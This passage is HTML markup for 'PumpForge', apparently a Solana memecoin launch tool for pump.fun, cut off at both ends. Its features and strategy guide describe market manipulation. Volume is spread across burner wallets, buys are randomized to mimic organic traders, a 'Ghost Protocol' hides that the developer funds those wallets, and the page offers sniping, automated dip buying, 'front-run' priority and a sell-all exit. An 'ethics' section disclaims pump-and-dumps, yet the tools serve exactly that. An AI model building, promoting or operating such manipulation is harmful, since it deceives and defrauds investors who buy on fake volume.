                                        <span>Copy</span>
                                    </div>
                                    <div class="action-btn-small" id="refresh-balance-btn">
                                        <svg class="icon" style="width:16px;height:16px;" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M23 4v6h-6"></path><path d="M1 20v-6h6"></path><path d="M3.51 9a9 9 0 0 1 14.85-3.36L23 10M1 14l4.64 4.36A9 9 0 0 0 20.49 15"></path></svg>
                                        <span>Refresh</span>
                                    </div>
                                </div>
                            </div>
                        
                            <!-- Section 2: Pro Menu -->
                            <div class="dropdown-section">
                                <div class="menu-item">
                                    <svg class="icon"><use xlink:href="#icon-sliders"></use></svg>
                                    <span>Transaction Priority</span>
                                </div>
                                <div class="menu-item">
                                    <svg class="icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 2v20M2 12h20"></path><path d="M12 2l4 4M12 2 8 6"></path></svg>
                                    <span>Activity Log (0)</span>
                                </div>
                                
                                <!-- Private Key Section (Clean Layout) -->
                                <div class="security-reveal" id="private-key-container">
                                    <div class="security-header" id="private-key-toggle">
                                        <div style="display:flex; gap:10px; align-items:center;">
                                            <svg class="icon" style="stroke: #ff6b6b;"><use xlink:href="#icon-key"></use></svg>
                                            <span style="font-size:0.9rem; font-weight:500; color:#ff6b6b;">Private Key</span>
                                        </div>
                                        <svg class="icon" style="width:14px;height:14px; transition: transform 0.3s ease;"><use xlink:href="#icon-arrow-down"></use></svg>
                                    </div>
                                    <div class="security-content" id="private-key-display">
                                        <span class="security-label-text">Click below to reveal & copy</span>
                                        <div class="pk-text-blur" id="private-key-text" title="Click to copy">
                                            <!-- Key injected here via JS -->
                                        </div>
                                    </div>
                                </div>
                            </div>
                        
                            <!-- Section 3: Danger Zone -->
                            <div class="dropdown-section">
                                <div class="menu-item danger" id="disconnect-wallet-btn">
                                    <svg class="icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4"></path><polyline points="16 17 21 12 16 7"></polyline><line x1="21" y1="12" x2="9" y2="12"></line></svg>
                                    <span>Disconnect Wallet</span>
                                </div>
                            </div>
                        </div>
                    </div>
                    <button class="withdraw-btn" id="withdraw-btn">
                        Withdraw
                    </button>
                    <button id="mobile-menu-toggle" aria-label="Open menu">
                        <span class="bar bar1"></span>
                        <span class="bar bar2"></span>
                        <span class="bar bar3"></span>
                    </button>
                </div>
            </header>

            <main id="create-coin-section" class="page-section active">
                <div class="form-container-wrapper">
                    <div class="form-container">
                        <div class="form-header">
                            <h1>Create new coin</h1>
                            <p>
                                Launch your token with an edge. These details
                                cannot be changed after creation.
                            </p>
                        </div>

                        <div class="form-section">
                            <h2>Coin Details</h2>
                            <div class="input-group">
                                <div class="input-field">
                                    <label for="coin-name">Coin name</label>
                                    <input type="text" id="coin-name" class="required-input" placeholder="e.g. Galactic Pepe">
                                    <div class="input-helper">Choose a unique, meme-able name. Avoid generic titles.</div>
                                </div>
                                <div class="input-field">
                                    <label for="ticker">Ticker</label>
                                    <input type="text" id="ticker" class="required-input" placeholder="e.g. GPEPE">
                                    <div class="input-helper">3-5 letters. This is your tag on Raydium.</div>
                                </div>
                            </div>
                            <div class="input-field">
                                <label for="description">Description</label>
                                <textarea id="description" placeholder="A short, effective description of your coin."></textarea>
                                <div class="input-helper">Narrative keywords drive algo discovery. Keep it punchy.</div>
                            </div>
                            <div class="dropdown-toggle" id="socials-toggle">
                                <svg class="icon">
                                    <use xlink:href="#icon-link"></use>
                                </svg>
                                <span>Add social links <span class="badge-recommended">Recommended</span></span>
                                <svg class="icon arrow-down">
                                    <use xlink:href="#icon-arrow-down"></use>
                                </svg>
                            </div>
                            <div class="dropdown-content" id="socials-content">
                                <p class="feature-description" style="margin-bottom: 15px;">Projects with socials verify 400% faster.</p>
                                <div class="input-group">
                                    <div class="input-field">
                                        <label>Website</label><input type="text" placeholder="https://yourcoin.com" />
                                    </div>
                                    <div class="input-field">
                                        <label>Twitter / X</label><input type="text" placeholder="https://x.com/yourcoin" />
                                    </div>
                                </div>
                                <div class="input-field">
                                    <label>Telegram</label><input type="text" placeholder="https://t.me/yourcoin" />
                                </div>
                            </div>
                        </div>

                        <div class="form-section">
                            <h2>Media</h2>
                            <div class="uploader" id="main-uploader">
                                <input type="file" id="main-file-input" class="file-input required-input" accept="image/*,video/mp4" />
                                <div class="uploader-content">
                                    <svg class="uploader-icon">
                                        <use xlink:href="#icon-image"></use>
                                    </svg>
                                    <p>Select video or image to upload</p>
                                    <button type="button" class="select-file-btn">Select file</button>
                                </div>
                                <div class="media-preview-container">
                                    <img class="media-preview" id="image-preview" src="" alt="Image preview" /><video class="media-preview" id="video-preview" autoplay loop muted playsinline src=""></video>
                                </div>
                                <button type="button" class="replace-file-btn">Replace</button>
                            </div>
                            <div class="input-helper" style="justify-content: center; margin-top: 12px;">
                                Need a logo? Try <a href="https://www.canva.com/create/logos/" target="_blank">Canva</a> or <a href="https://looka.com/" target="_blank">Looka</a>. High-quality art signals a serious dev.
                            </div>
                            <div class="file-info-container">
                                <div class="file-info">
                                    <svg class="icon"><use xlink:href="#icon-file"></use></svg>
                                    <div>
                                        <h4>File type</h4>
                                        <ul><li>JPG, PNG, GIF (max 15mb)</li></ul>
                                    </div>
                                </div>
                                <div class="file-info">
                                    <svg class="icon"><use xlink:href="#icon-aspect-ratio"></use></svg>
                                    <div>
                                        <h4>Aspect ratio</h4>
                                        <ul><li>1:1 square (1000x1000px)</li></ul>
                                    </div>
                                </div>
                            </div>
                        </div>

                        <div class="form-section">
                            <h2>Launch & Pump Configuration</h2>
                            <p class="feature-description" style="margin-bottom: 24px;">
                                Define your market entry parameters. These settings control the initial velocity of your token.
                            </p>
                        
                            <div class="input-field slider-field">
                                <div class="slider-header">
                                    <label>Dev Initial Buy</label><span id="dev-buy-value">2.5 SOL</span>
                                </div>
                                <input type="range" id="dev-buy-slider" min="0.1" max="12.5" step="0.1" value="2.5" class="custom-slider" />
                                <div class="input-helper">High dev holdings signal confidence to early buyers.</div>
                            </div>
                        
                            <div class="input-field slider-field">
                                <div class="slider-header">
                                    <label>Total Pump Amount</label><span id="sol-value">5.0 SOL</span>
                                </div>
                                <input type="range" id="total-sol-slider" min="0.1" max="10.0" step="0.1" value="5" class="custom-slider" />
                                <div class="input-helper">Total SOL used for volume. Higher volume = higher chart ranking.</div>
                            </div>
                        
                            <div class="input-field slider-field">
                                <div class="slider-header">
                                    <label>Pump Wallets</label><span id="wallets-value">10 Wallets</span>
                                </div>
                                <input type="range" id="pump-wallets-slider" min="1" max="25" value="10" class="custom-slider" />
                                <div class="input-helper">More wallets creates a more organic holder distribution.</div>
                            </div>
                        
                            <div class="input-field" style="margin-top: 24px; margin-bottom: 15px;">
                                <label>Pump Distribution Profile</label>
                                <div class="pump-btn-group" id="profile-btn-group">
                                    <button class="btn active" data-profile="fixed">Fixed</button>
                                    <button class="btn" data-profile="random">Random</button>
                                </div>
                                <!-- This paragraph is populated by your JS script, as requested -->
                                <p class="feature-description" id="profile-description"></p>
                            </div>
                        
                            <div class="summary-display" id="est-sol-per-wallet-display">
                                <div class="summary-row">
                                    <span>Est. SOL per Wallet</span><span id="sol-per-wallet-value">0.50 SOL</span>
                                </div>
                            </div>
                        
                            <div class="summary-display" id="total-cost-display">
                                <div class="summary-row">
                                    <span>Total Cost</span><span id="total-cost-value">7.50 SOL</span>
                                </div>
                            </div>
                        
                            <div class="dropdown-toggle" id="advanced-toggle">
                                <svg class="icon"><use xlink:href="#icon-sliders"></use></svg>
                                <span>Advanced Configuration</span>
                                <span class="status-dot" id="adv-status-dot"></span>
                                <svg class="icon arrow-down"><use xlink:href="#icon-arrow-down"></use></svg>
                            </div>
                        
                            <div class="dropdown-content" id="advanced-content">
                                <!-- Advanced modules (First Mover, Dip Buyer, Ghost) remain unchanged -->
                                <div class="adv-feature-module" id="first-mover-module">
                                    <div class="adv-feature-header">
                                        <h4>First Mover Advantage(Snipe)</h4>
                                        <label class="switch"><input type="checkbox" class="adv-toggle" /><span class="slider"></span></label>
                                    </div>
                                    <p class="feature-description" style="margin-top: 4px">Additional buy executed in the deployment block to signal momentum.</p>
                                    <div class="adv-feature-content">
                                         <div class="slider-field">
                                            <div class="slider-header">
                                                <label>First Buy Amount</label><span id="first-buy-sol-value">1.0 SOL</span>
                                            </div>
                                            <input type="range" id="first-buy-sol-slider" min="0.1" max="5" value="1" step="0.1" class="custom-slider" />
                                        </div>
                                        <div class="slider-field">
                                            <div class="slider-header">
                                                <label>First Buy Delay</label><span id="first-buy-delay-value">3 sec</span>
                                            </div>
                                            <input type="range" id="first-buy-delay-slider" min="0" max="30" value="3" step="1" class="custom-slider" />
                                        </div>
                                    </div>
                                </div>
                                
                                <div class="adv-feature-module" id="dip-buyer-module">
                                    <div class="adv-feature-header">
                                        <h4>Dip Buyer AI</h4>
                                        <label class="switch"><input type="checkbox" class="adv-toggle" /><span class="slider"></span></label>
                                    </div>
                                    <p class="feature-description">Automatically defends the price floor using reserved wallets.</p>
                                     <div class="adv-feature-content">
                                         <div class="slider-field">
                                            <div class="slider-header">
                                                <label>Defendable Wallets</label><span id="dip-wallets-value">3 Wallets</span>
                                            </div>
                                            <input type="range" id="dip-wallets-slider" min="0" max="10" value="3" step="1" class="custom-slider" />
                                        </div>
                                        <div class="slider-field">
                                            <div class="slider-header">
                                                <label>Buy Trigger Drop</label><span id="dip-trigger-value">15%</span>
                                            </div>
                                            <input type="range" id="dip-trigger-slider" min="5" max="50" value="15" step="1" class="custom-slider" />
                                        </div>
                                     </div>
                                </div>
                        
                                <div class="adv-feature-module" id="ghost-protocol-module">
                                    <div class="adv-feature-header">
                                        <h4>Ghost Protocol</h4>
                                        <label class="switch"><input type="checkbox" class="adv-toggle" /><span class="slider"></span></label>
                                    </div>
                                    <p class="feature-description">Obfuscates wallet funding and transactions to look organic.</p>
                                     <div class="adv-feature-content">
                                        <div class="ghost-protocol-sub-feature">
                                            <span class="label">Staggered Wallet Funding</span><label class="switch"><input type="checkbox" /><span class="slider"></span></label>
                                        </div>
                                        <div class="ghost-protocol-sub-feature">
                                            <span class="label">Multi-Tier Funding Cascade</span><label class="switch"><input type="checkbox" /><span class="slider"></span></label>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        
                            <!-- NEW: How It Works Link -->
                            <a href="#how-it-works" class="section-footer-link" data-page="how-it-works-section">
                                <svg class="icon" style="width:16px;height:16px;"><use xlink:href="#icon-info-circle"></use></svg>
                                <span>Confused? Read the Strategy Guide</span>
                            </a>
                        </div>

                        <button
                            class="create-coin-btn-main"
                            id="create-coin-btn"
                            disabled
                        >
                            Create & Launch Coin
                        </button>
                    </div>

                    <div class="preview-container">
                        <h2>Preview</h2>
                        <div class="preview-box">
                            <div class="media-preview-container">
                                <img
                                    class="media-preview"
                                    id="preview-image"
                                    src=""
                                    alt="Coin preview"
                                /><video
                                    class="media-preview"
                                    id="preview-video"
                                    autoplay
                                    loop
                                    muted
                                    playsinline
                                    src=""
                                ></video>
                            </div>
                            <div id="preview-box-content">
                                <svg
                                    class="icon"
                                    style="width: 48px; height: 48px"
                                >
                                    <use xlink:href="#icon-image"></use>
                                </svg>
                                <span>Your coin preview appears here</span>
                            </div>
                            <div class="preview-overlay">
                                <div class="preview-text-content">
                                    <div class="preview-header">
                                        <h3 id="preview-name">
                                            Your Coin Name
                                        </h3>
                                        <span id="preview-ticker">$TICKER</span>
                                    </div>
                                    <p id="preview-description">
                                        A short, effective description of your
                                        coin will appear here once you start
                                        typing.
                                    </p>
                                </div>
                            </div>
                        </div>
                    </div>
                    <!-- [NEW] REFINED MANUAL CONTROL PANEL -->
                    <!-- [NEW] MANUAL CONTROL MODAL -->
                    <div class="modal-overlay" id="manual-control-modal">
                        <div class="control-modal-box">
                            <h2>Manual Control</h2>

                            <div class="control-section">
                                <label>pump.fun Chart</label>
                                <a href="#" id="pump-fun-link" target="_blank" class="pump-link">
                                    <span>Open Chart</span>
                                    <svg class="icon" style="width: 16px; height: 16px;"><use xlink:href="#icon-link"></use></svg>
                                </a>
                            </div>

                            <div class="control-section pump-control-area">
                                <label>Pump Wallets</label>
                                <p class="control-description">Click to send one buy transaction from a funded wallet. Watch the chart and time your pumps strategically.</p>
                                <button class="pump-one-btn" id="pump-one-btn">
                                    <svg class="icon" style="width: 24px; height: 24px; stroke: #000; stroke-width: 2.5;"><polyline points="12 5 12 19"></polyline><polyline points="5 12 19 12"></polyline></svg>
                                    <span>Pump Wallet</span>
                                </button>
                                <span class="pumps-remaining-display" id="pumps-remaining-display"></span>
                            </div>

                            <div class="control-section sell-controls">
                                <label>Exit Strategy</label>
                                <p class="control-description">Use these actions to sell tokens and recover SOL. Actions are final.</p>
                                <div class="sell-btn-group">
                                    <button class="sell-btn dev-sell" id="dev-sell-btn">Sell as Dev</button>
                                    <button class="sell-btn all-sell" id="sell-all-btn">Sell All</button>
                                </div>
                            </div>
                        </div>
                    </div>
                    <!-- [END] MANUAL CONTROL MODAL -->
                    <!-- [END] REFINED MANUAL CONTROL PANEL -->
                </div>
            </main>

            <main id="about-section" class="page-section">
                <div class="page-header">
                    <h1>About PumpForge</h1>
                    <p>
                        The Solana ecosystem is crowded. We provide the kinetic energy 
                        legitimate projects need to escape velocity and capture immediate market attention.
                    </p>
                </div>
                
                <!-- Mission Statement -->
                <div class="content-box">
                    <h2>The Accelerator for Builders</h2>
                    <p>
                        In the current meta, 99% of tokens die within minutes due to lack of volume and visibility. 
                        <strong>PumpForge</strong> was built to solve the "Cold Start Problem." 
                        We automate the initial liquidity injection and volume generation that signals to the market: 
                        <em>"This project is alive, funded, and moving."</em>
                    </p>
                    <p>
                        We are not a bot for chaotic trading; we are a strategic launchpad designed to give high-quality 
                        developers the competitive edge required to survive the bonding curve and reach Raydium.
                    </p>
                </div>

                <!-- Feature Grid -->
                <div class="about-grid">
                    <div class="about-card">
                        <svg class="icon"><use xlink:href="#icon-forge"></use></svg>
                        <h3>Instant Traction</h3>
                        <p>Launch with a healthy chart structure. Our distribution protocols ensure your token doesn't look like a PvP bot-fest, but an organic breakout.</p>
                    </div>
                    <div class="about-card">
                        <svg class="icon"><use xlink:href="#icon-check-circle"></use></svg>
                        <h3>Volume Velocity</h3>
                        <p>Visibility on pump.fun is driven by volume. We ensure you hit the "King of the Hill" metrics faster than manual clickers ever could.</p>
                    </div>
                </div>

                <!-- Ethics & Disclaimer (The "Anti-Rug" Section) -->
                <div class="ethics-box">
                    <div class="ethics-header">
                        <svg class="icon"><use xlink:href="#icon-alert-triangle"></use></svg>
                        <h3>Our Stance on Ecosystem Integrity</h3>
                    </div>
                    <p>
                        <strong>PumpForge is an accelerator, not a weapon.</strong>
                    </p>
                    <p>
                        We strongly condemn the use of our technology for "rug pulls," "pump and dumps," or malicious liquidity extraction. 
                        This tool is designed for <strong>developers committed to the long-term success</strong> of their projects. 
                        Using automation to deceive investors undermines the Solana network and ruins the game for everyone.
                    </p>
                    <p class="ethics-footer">
                        Build something real. We'll help you launch it.
                    </p>
                </div>
            </main>
            <main id="how-it-works-section" class="page-section">
                <div class="page-header">
                    <h1>How It Works</h1>
                    <p>
                        Mastering the launch is about precision. Follow these steps to configure your deployment 
                        and execute a high-velocity entry into the market.
                    </p>
                </div>

                <div class="steps-container">
    
                    <!-- Step 1: Funding -->
                    <div class="step-card">
                        <div class="step-text">
                            <div class="step-badge">Phase 1</div>
                            <h3>Secure Environment Setup</h3>
                            <p>
                                Launches fail because of linked wallets. PumpForge generates a fresh, ephemeral <strong>Dev Wallet</strong> locally. 
                                This isolates your main assets and prevents "wallet bubbling" (trackers linking your dev wallet to your pump wallets).
                            </p>
                            <div class="pro-tip-box">
                                <div class="pro-tip-header">
                                    <svg class="icon" style="width:16px;height:16px;"><use xlink:href="#icon-info-circle"></use></svg>
                                    Capital Strategy
                                </div>
                                <p>We recommend funding <strong>7-10 SOL</strong>. This covers the initial Dev Buy, funds 10+ pump wallets, and pays for the "Ghost Protocol" gas fees without hitting transaction limits.</p>
                            </div>
                        </div>
                        <div class="step-visual">
                            <!-- Mock UI: Wallet -->
                            <div class="mock-ui-header">
                                <div class="mock-dot"></div><div class="mock-line" style="width: 60%"></div>
                            </div>
                            <div class="mock-ui-body">
                                <div class="mock-balance">7.50 SOL</div>
                                <div class="mock-btn">System Ready</div>
                            </div>
                        </div>
                    </div>
                
                    <!-- Step 2: Identity -->
                    <div class="step-card reverse">
                        <div class="step-text">
                            <div class="step-badge">Phase 2</div>
                            <h3>High-Fidelity Branding</h3>
                            <p>
                                In the "attention economy," your ticker and visual assets are your only leverage. 
                                Generic memes die in seconds. Use these tools to create professional assets that signal a "long-term hold" to buyers.
                            </p>
                            <div class="resource-links">
                                <a href="https://chat.openai.com/" target="_blank" class="resource-pill">
                                    <svg class="icon" style="width:14px;height:14px;"><use xlink:href="#icon-link"></use></svg> ChatGPT (Narratives)
                                </a>
                                <a href="https://www.midjourney.com/" target="_blank" class="resource-pill">
                                    <svg class="icon" style="width:14px;height:14px;"><use xlink:href="#icon-image"></use></svg> Midjourney (Art)
                                </a>
                                <a href="https://looka.com/" target="_blank" class="resource-pill">
                                    <svg class="icon" style="width:14px;height:14px;"><use xlink:href="#icon-forge"></use></svg> Looka (Logos)
                                </a>
                            </div>
                        </div>
                        <div class="step-visual">
                            <div class="mock-uploader">
                                <svg class="icon"><use xlink:href="#icon-image"></use></svg>
                                <div class="mock-line" style="width: 40%; height: 8px; margin: 10px auto;"></div>
                            </div>
                        </div>
                    </div>
                
                    <!-- Step 3: Distribution Strategy -->
                    <div class="step-card">
                        <div class="step-text">
                            <div class="step-badge">Phase 3</div>
                            <h3>Volume & Distribution Engineering</h3>
                            <p>
                                This is where you configure the <strong>PumpForge Engine</strong>. You aren't just buying; you are painting a chart structure.
                            </p>
                            <ul class="strategy-list">
                                <li><strong>Dev Buy:</strong> The supply you lock up. High % = Trust.</li>
                                <li><strong>Pump Amount:</strong> The SOL scattered across burner wallets to create volume.</li>
                                <li><strong>Profiles:</strong> 
                                    <br> - <em>Fixed:</em> Equal buys. Good for stability.
                                    <br> - <em>Random:</em> Varied buys. Mimics organic "fomo" traders.
                                </li>
                            </ul>
                        </div>
                        <div class="step-visual">
                            <div class="mock-slider-group">
                                <div class="mock-label-row"><div class="mock-line"></div><div class="mock-val"></div></div>
                                <div class="mock-slider-track"><div class="mock-slider-fill" style="width: 70%"></div></div>
                                <div class="mock-label-row"><div class="mock-line"></div><div class="mock-val"></div></div>
                                <div class="mock-slider-track"><div class="mock-slider-fill" style="width: 30%"></div></div>
                            </div>
                        </div>
                    </div>
                
                    <!-- Step 4: Advanced Protocols (Ghost/Dip) -->
                    <div class="step-card reverse">
                        <div class="step-text">
                            <div class="step-badge">Phase 4</div>
                            <h3>Stealth & Defense Protocols</h3>
                            <p>
                                Activate <strong>Ghost Protocol</strong> to obfuscate the link between your burner wallets and the Dev Wallet. 
                                This makes your launch look like a community effort, not a developer pump.
                            </p>
                            <div class="pro-tip-box">
                                <div class="pro-tip-header">
                                    <svg class="icon" style="width:16px;height:16px;"><use xlink:href="#icon-check-circle"></use></svg>
                                    The "Dip Buyer" Edge
                                </div>
                                <p>Enable the <strong>Dip Buyer AI</strong> to reserve 2-3 wallets. The system will automatically execute buys if the price drops by your set percentage (e.g., -15%), protecting your chart from early jeets.</p>
                            </div>
                        </div>
                        <div class="step-visual">
                            <div class="mock-chart">
                                <div class="mock-candle c1"></div>
                                <div class="mock-candle c2"></div>
                                <div class="mock-candle c3"></div>
                                <div class="mock-candle c4"></div>
                                <div class="mock-candle c5"></div>
                            </div>
                        </div>
                    </div>
                
                    <!-- Step 5: Post-Launch -->
                    <div class="step-card">
                        <div class="step-text">
                            <div class="step-badge">Phase 5</div>
                            <h3>Manual Command & Control</h3>
                            <p>
                                Once deployed, you enter the <strong>Command Center</strong>. Here, you control the momentum.
                            </p>
                            <p>
                                Use the <strong>"Pump Wallet"</strong> button to execute single, strategic buy orders from your remaining reserves. 
                                Time these buys to break resistance levels or recover from a dip.
                            </p>
                            <div class="pro-tip-box">
                                <div class="pro-tip-header">
                                    <svg class="icon" style="width:16px;height:16px;"><use xlink:href="#icon-alert-triangle"></use></svg>
                                    Exit Strategy
                                </div>
                                <p>Don't roundtrip your bags. Use the <strong>"Sell All"</strong> function only when you have achieved your target multiplier or reached King of the Hill.</p>
                            </div>
                        </div>
                        <div class="step-visual">
                            <div class="mock-control-panel">
                                <div class="mock-line" style="width: 50%; height: 10px; margin-bottom: 25px;"></div>
                                <div class="mock-btn mock-pump-btn">Pump Wallet (1 Left)</div>
                                <div class="mock-line" style="width: 40%; height: 6px; margin-top: 10px; background: #222;"></div>
                                <div class="mock-sell-group">
                                    <div class="mock-btn mock-sell-btn dev">Sell Dev</div>
                                    <div class="mock-btn mock-sell-btn all">Sell All</div>
                                </div>
                            </div>
                        </div>
                    </div>
                
                </div>
            </main>

            <main id="fees-section" class="page-section">
                <div class="page-header">
                    <h1>Transparent Pricing</h1>
                    <p>
                        No subscriptions, no hidden costs. Just a single, flat fee for a powerful, 
                        automated launch. Your committed SOL is used entirely for your token's liquidity and momentum.
                    </p>
                </div>

                <div class="cost-breakdown">
                    <!-- Our Platform Fee -->
                    <div class="fee-card primary">
                        <div class="fee-header">
                            <h3>PumpForge Platform Fee</h3>
                        </div>
                        <div class="fee-price">
                            <!-- JS will populate these values -->
                            <span id="platform-fee-sol">~0.00 SOL</span>
                            <span id="platform-fee-usd">$20.00 USD</span>
                        </div>
                        <p class="fee-description">
                            Our one-time fee is an investment in your launch's success, giving you access to automation and strategic tools.
                        </p>
                        <ul class="fee-includes-list">
                            <li>
                                <svg class="icon"><use xlink:href="#icon-check-circle"></use></svg>
                                <span>Automated Launch Sequence</span>
                            </li>
                            <li>
                                <svg class="icon"><use xlink:href="#icon-check-circle"></use></svg>
                                <span>Multi-Wallet Distribution Engine</span>
                            </li>
                            <li>
                                <svg class="icon"><use xlink:href="#icon-check-circle"></use></svg>
                                <span>Post-Launch Manual Control Panel</span>
                            </li>
                             <li>
                                <svg class="icon"><use xlink:href="#icon-check-circle"></use></svg>
                                <span>Advanced Strategy Configuration</span>
                            </li>
                        </ul>
                    </div>

                    <!-- Pass-Through Costs -->
                    <div class="fee-card">
                        <div class="fee-header">
                            <h3>External & Network Costs</h3>
                        </div>
                        <div class="pass-through-items">
                            <div class="fee-item">
                                <div>
                                    <h4>pump.fun Token Creation</h4>
                                    <span>The standard fee required by the pump.fun platform.</span>
                                </div>
                                <div class="fee-item-price">
                                    <span>0.01 SOL</span>
                                    <!-- JS will populate this -->
                                    <span id="pumpfun-fee-usd">~$0.00 USD</span>
                                </div>
                            </div>
                            <div class="fee-item">
                                <div>
                                    <h4>Solana Network Fees</h4>
                                    <span>Variable costs for transactions (funding, buys, etc). Billed directly by the network.</span>
                                </div>
                                <div class="fee-item-price">
                                    <span>Variable</span>
                                    <span>Pass-Through</span>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </main>
        </div>

        <footer class="app-footer">
            <div class="footer-container">
                <div class="footer-main">
                    <div class="footer-brand">
                        <div class="header-logo">
                            <svg
                                class="icon"
                                style="
                                    width: 28px;
                                    height: 28px;
                                    stroke: var(--accent-green);
                                "
                            >
                                <use xlink:href="#icon-forge"></use></svg
                            >PumpForge
                        </div>
                        <p>
                            The simplest way to create and launch your Solana
                            token with a competitive edge, right from the start.
                        </p>
                    </div>
                    <div class="footer-links">
                        <div class="footer-column">
                            <h4>Product</h4>
                            <ul>
                                <li>
                                    <a
                                        href="#create"
                                        class="footer-nav-link"
                                        data-page="create-coin-section"
                                        >Create Coin</a
                                    >
                                </li>
                                <li>
                                    <a
                                        href="#how-it-works"
                                        class="footer-nav-link"
                                        data-page="how-it-works-section"
                                        >How It Works</a
                                    >
                                </li>
                                <li>
                                    <a
                                        href="#fees"
                                        class="footer-nav-link"
                                        data-page="fees-section"
                                        >Fees</a
                                    >
                                </li>
                            </ul>
                        </div>
                        <div class="footer-column">
                            <h4>Legal</h4>
                            <ul>
                                <li><a href="#">Terms of Service</a></li>
                                <li><a href="#">Privacy Policy</a></li>
                            </ul>
                        </div>
                    </div>
                </div>
                <div class="footer-bottom-bar">
                    <span> 2025 PumpForge. All rights reserved.</span>
                    <div class="social-links">
                        <a href="#" aria-label="Twitter"
                            ><svg class="icon">
                                <use xlink:href="#icon-twitter-x"></use></svg
                        ></a>
                        <a href="#" aria-label="Telegram"
                            ><svg class="icon">
                                <use xlink:href="#icon-telegram"></use></svg
                        ></a>
                    </div>
                </div>
            </div>
        </footer>

        <div class="modal-overlay" id="withdraw-modal">
            <div class="modal-box">
                <div class="modal-header">
                    <h2>Withdraw</h2>
                    <button class="modal-close-btn" id="modal-close-btn">
                        <svg class="icon" style="width: 24px; height: 24px">
                            <use xlink:href="#icon-x"></use>
                        </svg>
                    </button>
                </div>
                <div class="modal-body">
                    <div class="input-field">
                        <label>Select Coin</label>
                        <div class="select-coin-container">
                            <img
                                src="https://cryptologos.cc/logos/solana-sol-logo.png?v=023"
                                alt="SOL"
                            />
                            <span>SOL</span>
                        </div>
                    </div>
                    <div class="input-field">
                        <label for="withdraw-amount">Amount</label>
                        <div class="input-with-button">
                            <input
                                type="text"
                                id="withdraw-amount"
                                placeholder="0.0"
                            />
                            <button class="max-btn" id="max-btn">Max</button>
                        </div>
                        <span
                            id="withdraw-usd-value"
                            class="usd-value-display"
                        ></span>
                    </div>
                    <div class="input-field">
                        <label for="recipient-address"
                            >Recipient Wallet Address</label
                        >
                        <input
                            type="text"
                            id="recipient-address"
                            placeholder="Enter SOL wallet address"
                        />
                    </div>
                </div>
                <div class="modal-footer">
                    <button
                        class="modal-withdraw-btn"
                        id="modal-withdraw-execute-btn"
                    >
                        Withdraw
                    </button>
                </div>
            </div>
        </div>
        <!-- [NEW] LAUNCH LOADING MODAL -->
        <div class="modal-overlay" id="loading-modal" style="display: none; z-index: 1001;">
            <div class="loading-box">
                <div class="spinner"></div>
                <h2 id="loading-title">Launch in Progress...</h2>
                <p id="loading-status-text">Please wait, do not close this page.</p>
            </div>
        </div>

        <!-- Transaction Priority Modal -->
        <div class="modal-overlay" id="priority-modal">
            <div class="modal-box" style="max-width: 380px;">
                <div class="modal-header">
                    <h2>Transaction Priority</h2>
                    <button class="modal-close-btn" onclick="closeModal('priority-modal')"><svg class="icon"><use xlink:href="#icon-x"></use></svg></button>
                </div>
                <div class="modal-body">
                    <p style="color:var(--text-secondary); font-size:0.9rem; margin-bottom:20px;">
                        Set the compute unit price for your transactions to ensure inclusion during congestion.
                    </p>
                    <div class="priority-options">
                        <div class="priority-card" onclick="setPriority('Standard')" id="prio-standard">
                            <div class="prio-header"><span>Standard</span><span class="prio-cost">Market</span></div>
                            <div class="prio-desc">Good for normal conditions.</div>
                        </div>
                        <div class="priority-card active" onclick="setPriority('Fast')" id="prio-fast">
                            <div class="prio-header"><span>Fast</span><span class="prio-cost">+0.002 SOL</span></div>
                            <div class="prio-desc">Recommended for launches.</div>
                        </div>
                        <div class="priority-card" onclick="setPriority('Turbo')" id="prio-turbo">
                            <div class="prio-header"><span>Turbo</span><span class="prio-cost">+0.005 SOL</span></div>
                            <div class="prio-desc">Front-run pending txs.</div>
                        </div>
                    </div>
                </div>
                <div class="modal-footer">
                    <button class="modal-withdraw-btn" onclick="closeModal('priority-modal')">Save Settings</button>
                </div>
            </div>
        </div>

        <!-- Activity Log Modal -->
        <div class="modal-overlay" id="activity-modal">
            <div class="modal-box" style="max-width: 500px;">
                <div class="modal-header">
                    <h2>Activity Log</h2>
                    <button class="modal-close-btn" onclick="closeModal('activity-modal')"><svg class="icon"><use xlink:href="#icon-x"></use></svg></button>
                </div>
                <div class="modal-body" style="padding: 0;">
                    <div id="activity-list" style="max-height: 400px; overflow-y: auto; padding: 0;">
                        <!-- Logs injected here -->
                    </div>
                </div>
                <div class="modal-footer" style="border-top: 1px solid var(--border-color); padding: 16px;">
                    <button class="action-btn-small" onclick="clearLogs()" style="width:100%;">Clear History</button>
                </div>
            </div>
        </div>
        <!-- Onboarding Tour Container -->
        <div class="tour-overlay" id="tour-overlay"></div>
        <div class="tour-tooltip" id="tour-tooltip">
            <div class="tour-arrow" id="tour-arrow"></div>
            <div id="tour-content">
                <!-- Content injected via JS -->
            </div>
        </div>

        <!-- Terms of Service Modal -->
        <div class="modal-overlay" id="tos-modal">
            <div class="modal-box" style="max-width: 600px; display: flex; flex-direction: column; max-height: 85vh;">
                <div class="modal-header">
                    <h2>Terms of Service</h2>
                    <button class="modal-close-btn" onclick="closeModal('tos-modal')"><svg class="icon"><use xlink:href="#icon-x"></use></svg></button>
                </div>
                <div class="modal-body" style="overflow-y: auto; padding-right: 12px; line-height: 1.6; color: var(--text-secondary); font-size: 0.9rem;">
                    <h4 style="color:var(--text-primary); margin-top:0;">1. Acceptance of Terms</h4>
                    <p style="margin-bottom:12px;">By accessing and using PumpForge ("the Platform"), you accept and agree to be bound by the terms and provision of this agreement. If you do not agree to abide by these terms, please do not use this service.</p>
                    
                    <h4 style="color:var(--text-primary);">2. Nature of Services</h4>
                    <p style="margin-bottom:12px;">PumpForge provides software-as-a-service (SaaS) tools for interacting with the Solana blockchain. The Platform is non-custodial; we do not manage, retain, or secure your private keys or assets. You retain full control and responsibility for your wallet credentials.</p>
                    
                    <h4 style="color:var(--text-primary);">3. User Responsibilities</h4>
                    <p style="margin-bottom:12px;">You acknowledge that you are fully responsible for the security of your private keys. The Platform generates ephemeral "Dev Wallets" for session usage. It is your sole responsibility to export and secure these credentials. PumpForge accepts no liability for lost keys, failed exports, or browser cache clearing.</p>
                    
                    <h4 style="color:var(--text-primary);">4. Blockchain Risks</h4>
